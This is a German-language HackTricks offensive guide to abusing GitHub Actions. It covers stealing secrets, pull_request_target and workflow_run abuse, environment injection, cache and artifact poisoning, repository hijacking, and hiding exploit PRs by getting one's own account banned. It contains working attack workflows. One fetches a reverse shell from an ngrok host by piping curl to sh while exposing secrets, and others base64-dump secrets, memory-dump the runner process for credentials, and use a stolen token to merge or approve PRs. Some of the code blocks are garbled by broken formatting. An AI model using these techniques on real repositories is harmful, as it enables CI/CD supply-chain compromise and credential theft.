# Abusing Github Actions

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>

## Grundlegende Informationen

Auf dieser Seite finden Sie:

* Eine **Zusammenfassung aller Auswirkungen**, wenn ein Angreifer Zugriff auf eine Github-Action erh√§lt.
* Unterschiedliche M√∂glichkeiten, um **Zugriff auf eine Aktion zu erhalten**:
  * Berechtigungen zum Erstellen der Aktion haben
  * Ausnutzen von **Pull-Request**-bezogenen Triggern
  * Ausnutzen von **anderen externen Zugriffstechniken**
  * **Pivotieren** von einem bereits kompromittierten Repository
* Schlie√ülich einen Abschnitt √ºber **Post-Exploitationstechniken zur Ausnutzung einer Aktion von innen heraus** (verursacht die genannten Auswirkungen)

## Zusammenfassung der Auswirkungen

F√ºr eine Einf√ºhrung in [**Github Actions √ºberpr√ºfen Sie die grundlegenden Informationen**](../basic-github-information.md#github-actions).

Falls Sie **beliebige Github-Aktionen ausf√ºhren/Code einschleusen** k√∂nnen in einem **Repository**, k√∂nnten Sie in der Lage sein:

* Die **Geheimnisse** aus diesem Repo/Organisation **stehlen**.
* Wenn Sie nur einschleusen k√∂nnen, k√∂nnen Sie alles stehlen, was bereits im Workflow vorhanden ist.
* Missbrauch von **Repo-Berechtigungen**, um auf andere Plattformen wie AWS und GCP zuzugreifen.
* **Code in benutzerdefinierten Workern ausf√ºhren** (falls benutzerdefinierte Worker verwendet werden) und von dort aus versuchen zu pivotieren.
* Repository-**Code √ºberschreiben**.
* Dies h√§ngt von den Berechtigungen des `GITHUB_TOKEN` ab (falls vorhanden).
* **Bereitstellungen** und andere **Artefakte kompromittieren**.
* Wenn der Code etwas bereitstellt oder speichert, k√∂nnten Sie dies √§ndern und weiteren Zugriff erhalten.

## GITHUB\_TOKEN

Dieses "**Geheimnis**" (aus `${{ secrets.GITHUB_TOKEN }}` und `${{ github.token }}`) wird gegeben, wenn der Administrator diese Option aktiviert:

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Dieses Token ist dasselbe, das eine **Github-Anwendung verwenden wird**, sodass es auf die gleichen Endpunkte zugreifen kann: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github sollte einen [**Ablauf**](https://github.com/github/roadmap/issues/74) ver√∂ffentlichen, der **cross-repository**-Zugriff innerhalb von GitHub erm√∂glicht, sodass ein Repo auf andere interne Repos mithilfe des `GITHUB_TOKEN` zugreifen kann.
{% endhint %}

Sie k√∂nnen die m√∂glichen **Berechtigungen** dieses Tokens unter [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token) einsehen.

Beachten Sie, dass das Token **nach Abschluss des Jobs abl√§uft**.\
Diese Tokens sehen so aus: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Einige interessante Dinge, die Sie mit diesem Token tun k√∂nnen:

{% tabs %}
{% tab title="PR zusammenf√ºhren" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Genehmigen von PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Pull-Anfrage erstellen" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Beachten Sie, dass Sie in mehreren F√§llen **GitHub-Benutzertoken in den Umgebungen von GitHub Actions oder in den Secrets** finden k√∂nnen. Diese Tokens k√∂nnen Ihnen mehr Rechte √ºber das Repository und die Organisation geben.
{% endhint %}

<details>

<summary>Liste Secrets im GitHub Action-Output auf</summary>

\`\`\`yaml name: list\_env on: workflow\_dispatch: # Launch manually pull\_request: #Run it when a PR is created to a branch branches: - '\*\*' push: # Run it when a push is made to a branch branches: - '\*\*' jobs: List\_env: runs-on: ubuntu-latest steps: - name: List Env # Need to base64 encode or github will change the secret value for "\*\*\*" run: sh -c 'env | grep "secret\_" | base64 -w0' env: secret\_myql\_pass: $\{{secrets.MYSQL\_PASSWORD\}} secret\_postgress\_pass: $\{{secrets.POSTGRESS\_PASSWORDyaml\}} \`\`\`

</details>

<details>

<summary>Erhalten Sie eine Reverse-Shell mit Geheimnissen</summary>

\`\`\`yaml name: revshell on: workflow\_dispatch: # Launch manually pull\_request: #Run it when a PR is created to a branch branches: - '\*\*' push: # Run it when a push is made to a branch branches: - '\*\*' jobs: create\_pull\_request: runs-on: ubuntu-latest steps: - name: Get Rev Shell run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh' env: secret\_myql\_pass: $\{{secrets.MYSQL\_PASSWORD\}} secret\_postgress\_pass: $\{{secrets.POSTGRESS\_PASSWORDyaml\}} \`\`\`

</details>

Es ist m√∂glich, die Berechtigungen zu √ºberpr√ºfen, die einem Github-Token in den Repositories anderer Benutzer **√ºberpr√ºfen der Logs** der Aktionen:

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## Erlaubte Ausf√ºhrung

{% hint style="info" %}
Dies w√§re der einfachste Weg, um Github-Aktionen zu kompromittieren, da in diesem Fall davon ausgegangen wird, dass Sie Zugriff haben, um **ein neues Repo in der Organisation zu erstellen**, oder **Schreibrechte √ºber ein Repository** haben.

Wenn Sie sich in diesem Szenario befinden, k√∂nnen Sie einfach die [Post-Exploitation-Techniken](./#post-exploitation-techniques-from-inside-an-action) √ºberpr√ºfen.
{% endhint %}

### Ausf√ºhrung durch Erstellung eines Repos

Falls Mitglieder einer Organisation **neue Repos erstellen** k√∂nnen und Sie Github-Aktionen ausf√ºhren k√∂nnen, k√∂nnen Sie **ein neues Repo erstellen und die auf Organisationsebene festgelegten Geheimnisse stehlen**.

### Ausf√ºhrung von einem neuen Branch

Wenn Sie **einen neuen Branch in einem Repository erstellen k√∂nnen, das bereits eine konfigurierte Github-Aktion** enth√§lt, k√∂nnen Sie diese **√§ndern**, den **Inhalt hochladen** und dann **diese Aktion vom neuen Branch ausf√ºhren**. Auf diese Weise k√∂nnen Sie **Geheimnisse auf Repository- und Organisationsebene exfiltrieren** (aber Sie m√ºssen wissen, wie sie genannt werden).

Sie k√∂nnen die modifizierte Aktion **manuell** ausf√ºhrbar machen, wenn ein **PR erstellt wird** oder wenn **einige Codes gepusht werden** (je nachdem, wie auff√§llig Sie sein m√∂chten):

```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```

***

## Forked Execution

{% hint style="info" %}
Es gibt verschiedene Ausl√∂ser, die einem Angreifer erm√∂glichen k√∂nnten, **eine Github-Action eines anderen Repositorys auszuf√ºhren**. Wenn diese ausl√∂sbaren Aktionen schlecht konfiguriert sind, k√∂nnte ein Angreifer sie kompromittieren k√∂nnen.
{% endhint %}

### `pull_request`

Der Workflow-Ausl√∂ser **`pull_request`** f√ºhrt den Workflow jedes Mal aus, wenn ein Pull Request empfangen wird, mit einigen Ausnahmen: Standardm√§√üig muss, wenn es sich um das **erste Mal** handelt, dass Sie \*\*zusammenarbeiten, ein **Maintainer** die **Ausf√ºhrung** des Workflows **genehmigen**:

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Da die **Standardbeschr√§nkung** f√ºr \*\*Erstbeitr√§ger gilt, k√∂nnten Sie dazu beitragen, **einen g√ºltigen Fehler/Tippfehler zu beheben** und dann **andere PRs senden, um Ihre neuen `pull_request`-Berechtigungen zu missbrauchen**.

**Ich habe dies getestet und es funktioniert nicht**: ~~Eine andere M√∂glichkeit w√§re, ein Konto mit dem Namen einer Person zu erstellen, die zum Projekt beigetragen hat und ihr Konto gel√∂scht hat.~~
{% endhint %}

Dar√ºber hinaus **verhindert standardm√§√üig Schreibberechtigungen** und **Zugriff auf Secrets** auf das Ziel-Repository, wie in der [**Dokumentation**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories) erw√§hnt:

> Mit Ausnahme von `GITHUB_TOKEN` werden **Secrets nicht an den Runner √ºbergeben**, wenn ein Workflow von einem **geforkten** Repository ausgel√∂st wird. Das **`GITHUB_TOKEN` hat Leseberechtigungen** in Pull Requests **aus geforkten Repositories**.

Ein Angreifer k√∂nnte die Definition der Github-Action √§ndern, um beliebige Dinge auszuf√ºhren und beliebige Aktionen anzuh√§ngen. Er wird jedoch nicht in der Lage sein, Secrets zu stehlen oder das Repo zu √ºberschreiben, aufgrund der genannten Einschr√§nkungen.

{% hint style="danger" %}
**Ja, wenn der Angreifer im PR die Github-Action √§ndert, die ausgel√∂st wird, wird seine Github-Action verwendet und nicht die aus dem Ursprungs-Repo!**
{% endhint %}

Da der Angreifer auch den ausgef√ºhrten Code kontrolliert, k√∂nnte ein Angreifer beispielsweise **b√∂sartige Artefakte hochladen**.

### **`pull_request_target`**

Der Workflow-Ausl√∂ser **`pull_request_target`** hat **Schreibberechtigungen** f√ºr das Ziel-Repository und **Zugriff auf Secrets** (und fragt nicht um Erlaubnis).

Beachten Sie, dass der Workflow-Ausl√∂ser **`pull_request_target`** im **Basis-Kontext** und nicht im Kontext des PRs ausgef√ºhrt wird (um **nicht vertrauensw√ºrdigen Code auszuf√ºhren**). F√ºr weitere Informationen zu `pull_request_target` [**√ºberpr√ºfen Sie die Dokumentation**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Dar√ºber hinaus finden Sie weitere Informationen zu dieser spezifischen gef√§hrlichen Verwendung in diesem [**Github-Blog-Beitrag**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Es mag so aussehen, als ob, weil der **ausgef√ºhrte Workflow** der im **Basis** definierte ist und **nicht im PR**, es **sicher** ist, **`pull_request_target`** zu verwenden, aber es gibt **einige F√§lle, in denen es nicht sicher ist**.

Und dieser wird **Zugriff auf Secrets** haben.

### `workflow_run`

Der [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run)-Ausl√∂ser erm√∂glicht es, einen Workflow aus einem anderen auszuf√ºhren, wenn er `abgeschlossen`, `angefordert` oder `in_progress` ist.

In diesem Beispiel ist ein Workflow so konfiguriert, dass er nach Abschluss des separaten Workflows "Run Tests" ausgef√ºhrt wird:

```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```

Dar√ºber hinaus kann der Workflow, der durch das Ereignis `workflow_run` gestartet wird, **Geheimnisse abrufen und Tokens schreiben, selbst wenn der vorherige Workflow dies nicht konnte**.

Ein solcher Workflow k√∂nnte angegriffen werden, wenn er von einem **Workflow abh√§ngt**, der von einem externen Benutzer √ºber **`pull_request`** oder **`pull_request_target`** ausgel√∂st werden kann. Ein paar anf√§llige Beispiele finden Sie in [**diesem Blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Das erste Beispiel besteht darin, dass der durch `workflow_run` ausgel√∂ste Workflow den Code des Angreifers herunterl√§dt: `${{ github.event.pull_request.head.sha }}`\
Das zweite Beispiel besteht darin, ein **Artefakt** aus dem **nicht vertrauensw√ºrdigen** Code an den **`workflow_run`**-Workflow zu √ºbergeben und den Inhalt dieses Artefakts auf eine Weise zu verwenden, die ihn **anf√§llig f√ºr RCE** macht.

### `workflow_call`

TODO

TODO: √úberpr√ºfen Sie, ob bei Ausf√ºhrung aus einem `pull_request` der verwendete/heruntergeladene Code von der Ursprungsquelle oder von der geforkten PR stammt

## Missbrauch von geforkten Ausf√ºhrungen

Wir haben alle M√∂glichkeiten erw√§hnt, wie ein externer Angreifer einen GitHub-Workflow zur Ausf√ºhrung bringen k√∂nnte. Schauen wir uns nun an, wie diese Ausf√ºhrungen bei schlechter Konfiguration missbraucht werden k√∂nnten:

### Ausf√ºhrung nicht vertrauensw√ºrdiger Checkouts

Im Fall von **`pull_request`** wird der Workflow im **Kontext des PRs** ausgef√ºhrt (somit wird der **b√∂sartige PR-Code** ausgef√ºhrt), aber jemand muss ihn **zuerst autorisieren** und er wird mit einigen [Einschr√§nkungen](./#pull\_request) ausgef√ºhrt.

Wenn ein Workflow **`pull_request_target` oder `workflow_run`** verwendet, der von einem Workflow abh√§ngt, der von **`pull_request_target` oder `pull_request`** ausgel√∂st werden kann, wird der Code aus dem Original-Repository ausgef√ºhrt, sodass der **Angreifer den ausgef√ºhrten Code nicht kontrollieren kann**.

{% hint style="danger" %}
Wenn die **Aktion** jedoch ein **explizites PR-Checkout** hat, das den Code aus dem PR (und nicht aus dem Basiscode) holt, wird der vom Angreifer kontrollierte Code verwendet. Zum Beispiel (√ºberpr√ºfen Sie Zeile 12, wo der PR-Code heruntergeladen wird):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># UNSICHER. Nur als Beispiel bereitgestellt.
on:
pull_request_target

jobs:
build:
name: Build und Test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Danke!
</code></pre>

Der potenziell **nicht vertrauensw√ºrdige Code wird w√§hrend `npm install` oder `npm build` ausgef√ºhrt**, da die Build-Skripte und referenzierten **Pakete vom Autor des PRs kontrolliert werden**.

{% hint style="warning" %}
Ein GitHub-Dork zur Suche nach anf√§lligen Aktionen ist: `event.pull_request pull_request_target extension:yml`, es gibt jedoch verschiedene M√∂glichkeiten, die Jobs sicher auszuf√ºhren, selbst wenn die Aktion unsicher konfiguriert ist (z. B. Verwendung von Bedingungen, um festzulegen, wer der Akteur ist, der den PR generiert).
{% endhint %}

### Kontextskript-Injektionen <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Beachten Sie, dass es bestimmte [**GitHub-Kontexte**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) gibt, deren Werte vom **Benutzer** erstellt werden, der den PR erstellt. Wenn die GitHub-Aktion diese **Daten verwendet, um etwas auszuf√ºhren**, k√∂nnte dies zu **beliebiger Codeausf√ºhrung** f√ºhren:

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV Skript-Injektion** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Laut Dokumentation: Sie k√∂nnen eine **Umgebungsvariable f√ºr alle nachfolgenden Schritte** in einem Workflow-Job verf√ºgbar machen, indem Sie die Umgebungsvariable definieren oder aktualisieren und dies in die **`GITHUB_ENV`**-Umgebungsdatei schreiben.

Wenn ein Angreifer einen Wert in diese **env**-Variable **einschleusen k√∂nnte**, k√∂nnte er Umgebungsvariablen einschleusen, die in den folgenden Schritten wie **LD\_PRELOAD** oder **NODE\_OPTIONS** Code ausf√ºhren k√∂nnten.

Zum Beispiel ([**hier**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) und [**hier**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), stellen Sie sich einen Workflow vor, der ein hochgeladenes Artefakt vertraut, um dessen Inhalt in der **`GITHUB_ENV`**-Umgebungsvariable zu speichern. Ein Angreifer k√∂nnte etwas wie dies hochladen, um es zu kompromittieren:

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

### Anf√§llige Drittanbieter-Github-Aktionen

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Wie in [**diesem Blogbeitrag**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks) erw√§hnt, erm√∂glicht diese GitHub-Aktion den Zugriff auf Artefakte aus verschiedenen Workflows und sogar Repositories.

Das Problem besteht darin, dass wenn der **`path`**-Parameter nicht festgelegt ist, das Artefakt im aktuellen Verzeichnis extrahiert wird und Dateien √ºberschreiben kann, die sp√§ter verwendet oder sogar im Workflow ausgef√ºhrt werden k√∂nnten. Daher k√∂nnte ein Angreifer, wenn das Artefakt anf√§llig ist, dies missbrauchen, um andere Workflows zu kompromittieren, die dem Artefakt vertrauen.

Beispiel f√ºr einen anf√§lligen Workflow:

```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```

Dies k√∂nnte mit diesem Workflow angegriffen werden:

```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```

***

## Andere externe Zugriffe

### Gel√∂schtes Namespace-Repo-Hijacking

Wenn ein Konto seinen Namen √§ndert, k√∂nnte ein anderer Benutzer nach einiger Zeit ein Konto mit diesem Namen registrieren. Wenn ein Repository **vor der Namens√§nderung weniger als 100 Sterne hatte**, erlaubt Github dem neuen registrierten Benutzer mit demselben Namen, ein **Repository mit demselben Namen** wie das gel√∂schte zu erstellen.

{% hint style="danger" %}
Wenn also eine Aktion ein Repository von einem nicht existierenden Konto verwendet, ist es immer noch m√∂glich, dass ein Angreifer dieses Konto erstellt und die Aktion kompromittiert.
{% endhint %}

Wenn andere Repositories **Abh√§ngigkeiten von den Repositories dieses Benutzers** verwendeten, kann ein Angreifer sie √ºbernehmen. Hier finden Sie eine ausf√ºhrlichere Erkl√§rung: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Repo-Pivotisierung

{% hint style="info" %}
In diesem Abschnitt werden Techniken besprochen, die es erm√∂glichen w√ºrden, **von einem Repository zu einem anderen zu pivotieren**, vorausgesetzt, wir haben auf dem ersten irgendwie Zugriff (√ºberpr√ºfen Sie den vorherigen Abschnitt).
{% endhint %}

### Cache-Vergiftung

Ein Cache wird zwischen **Workflow-L√§ufen im selben Branch** aufrechterhalten. Das bedeutet, dass wenn ein Angreifer ein **Paket kompromittiert**, das dann im Cache gespeichert und von einem **privilegierteren** Workflow heruntergeladen und ausgef√ºhrt wird, er auch diesen Workflow **kompromittieren** kann.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Artefakt-Vergiftung

Workflows k√∂nnten **Artefakte aus anderen Workflows und sogar Repositories verwenden**, wenn es einem Angreifer gelingt, die Github-Aktion zu **kompromittieren**, die ein Artefakt hochl√§dt, das sp√§ter von einem anderen Workflow verwendet wird, k√∂nnte er **die anderen Workflows kompromittieren**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Post-Exploitation aus einer Aktion

### Zugriff auf AWS und GCP √ºber OIDC

√úberpr√ºfen Sie die folgenden Seiten:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Zugriff auf Geheimnisse <a href="#accessing-secrets" id="accessing-secrets"></a>

Wenn Sie Inhalte in ein Skript einf√ºgen, ist es interessant zu wissen, wie Sie auf Geheimnisse zugreifen k√∂nnen:

* Wenn das Geheimnis oder Token auf eine **Umgebungsvariable** gesetzt ist, kann es direkt √ºber die Umgebung mit **`printenv`** abgerufen werden.

<details>

<summary>Geheimnisse im Github Action-Output auflisten</summary>

\`\`\`yaml name: list\_env on: workflow\_dispatch: # Launch manually pull\_request: #Run it when a PR is created to a branch branches: - '\*\*' push: # Run it when a push is made to a branch branches: - '\*\*' jobs: List\_env: runs-on: ubuntu-latest steps: - name: List Env # Need to base64 encode or github will change the secret value for "\*\*\*" run: sh -c 'env | grep "secret\_" | base64 -w0' env: secret\_myql\_pass: $\{{secrets.MYSQL\_PASSWORD\}}

secret\_postgress\_pass: $\{{secrets.POSTGRESS\_PASSWORDyaml\}}

````
</details>

<details>

<summary>Erhalten Sie eine Reverse-Shell mit Secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
````

</details>

* Wenn das Geheimnis **direkt in einem Ausdruck** verwendet wird, wird das generierte Shell-Skript **auf der Festplatte** gespeichert und ist zug√§nglich.
* ```bash
  ```

cat /home/runner/work/\_temp/\*

````
* F√ºr JavaScript-Aktionen werden die Geheimnisse √ºber Umgebungsvariablen √ºbermittelt.
* ```bash
ps axe | grep node
````

* F√ºr eine **benutzerdefinierte Aktion** kann das Risiko je nachdem, wie ein Programm das Geheimnis verwendet, das es aus dem **Argument** erhalten hat, variieren:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Missbrauch von selbstgehosteten Runnern

Der Weg, um herauszufinden, welche **Github-Aktionen in nicht-Github-Infrastruktur** ausgef√ºhrt werden, besteht darin, nach **`runs-on: self-hosted`** in der Konfigurations-YAML der Github-Aktion zu suchen.

**Selbstgehostete** Runner k√∂nnten Zugriff auf **zus√§tzlich sensible Informationen** haben, auf andere **Netzwerksysteme** (anf√§llige Endpunkte im Netzwerk? Metadatendienst?) oder, selbst wenn es isoliert und zerst√∂rt wird, k√∂nnte **mehr als eine Aktion gleichzeitig ausgef√ºhrt werden** und die b√∂sartige Aktion k√∂nnte die Geheimnisse der anderen stehlen.

Bei selbstgehosteten Runnern ist es auch m√∂glich, die **Geheimnisse aus dem \_Runner.Listener**\_\*\* Prozess\*\* zu erhalten, der alle Geheimnisse der Workflows in jedem Schritt enth√§lt, indem sein Speicher gedumpt wird:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

√úberpr√ºfen Sie [**diesen Beitrag f√ºr weitere Informationen**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker-Images-Registry

Es ist m√∂glich, Github-Aktionen zu erstellen, die **ein Docker-Image innerhalb von Github erstellen und speichern**.\
Ein Beispiel finden Sie im folgenden ausklappbaren Bereich:

<details>

<summary>Github-Aktion zum Erstellen und Pushen von Docker-Images</summary>

\`\`\`yaml \[...]

* name: Set up Docker Buildx uses: docker/setup-buildx-action@v1
* name: Login to GitHub Container Registry uses: docker/login-action@v1 with: registry: ghcr.io username: $\{{ github.repository\_owner \}} password: $\{{ secrets.ACTIONS\_TOKEN \}}
* name: Add Github Token to Dockerfile to be able to download code run: | sed -i -e 's/TOKEN=##VALUE##/TOKEN=$\{{ secrets.ACTIONS\_TOKEN \}}/g' Dockerfile
* name: Build and push uses: docker/build-push-action@v2 with: context: . push: true tags: | ghcr.io/$\{{ github.repository\_owner \}}/$\{{ github.event.repository.name \}}:latest ghcr.io/$\{{ github.repository\_owner \}}/$\{{ github.event.repository.name \}}:$\{{ env.GITHUB\_NEWXREF \}}-$\{{ github.sha \}}

\[...]

````
</details>

Wie Sie im vorherigen Code sehen konnten, wird das Github-Register unter **`ghcr.io`** gehostet.

Ein Benutzer mit Leseberechtigungen f√ºr das Repository kann dann das Docker-Image mithilfe eines pers√∂nlichen Zugriffstokens herunterladen:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
````

Dann k√∂nnte der Benutzer nach **geleakten Geheimnissen in den Docker-Image-Schichten suchen:**

#### Sensible Informationen in Github Actions-Protokollen

Auch wenn **Github** versucht, **geheime Werte zu erkennen** in den Aktionsprotokollen und **vermeidet, sie anzuzeigen**, werden **andere sensible Daten**, die w√§hrend der Ausf√ºhrung der Aktion generiert wurden, nicht versteckt. Zum Beispiel wird ein mit einem geheimen Wert signiertes JWT nicht versteckt, es sei denn, es ist [speziell konfiguriert](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

### Spuren verwischen

(Technik von [**hier**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Zun√§chst einmal ist jedes erhobene PR f√ºr die √ñffentlichkeit auf Github und f√ºr das Ziel-GitHub-Konto klar sichtbar. Auf GitHub k√∂nnen wir standardm√§√üig **kein PR aus dem Internet l√∂schen**, aber es gibt einen Trick. F√ºr Github-Konten, die von Github **gesperrt** sind, werden alle ihre **PRs automatisch gel√∂scht** und aus dem Internet entfernt. Um Ihre Aktivit√§ten zu verbergen, m√ºssen Sie entweder Ihr **GitHub-Konto sperren lassen oder Ihr Konto markieren lassen**. Dadurch werden **alle Ihre Aktivit√§ten** auf GitHub vor dem Internet verborgen (im Grunde genommen werden alle Ihre Exploit-PRs entfernt).

Eine Organisation auf GitHub ist sehr proaktiv bei der Meldung von Konten an GitHub. Alles, was Sie tun m√ºssen, ist, "ein paar Dinge" in einem Issue zu teilen, und sie werden sicherstellen, dass Ihr Konto in 12 Stunden gesperrt wird :p und da haben Sie es, Ihren Exploit auf Github unsichtbar gemacht.

Der einzige Weg f√ºr eine Organisation herauszufinden, dass sie angegriffen wurde, besteht darin, die GitHub-Protokolle aus SIEM zu √ºberpr√ºfen, da der PR aus der GitHub-Benutzeroberfl√§che entfernt w√ºrde.

### Tools

Die folgenden Tools sind n√ºtzlich, um Github Action-Workflows zu finden und sogar verwundbare zu finden:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

</details>
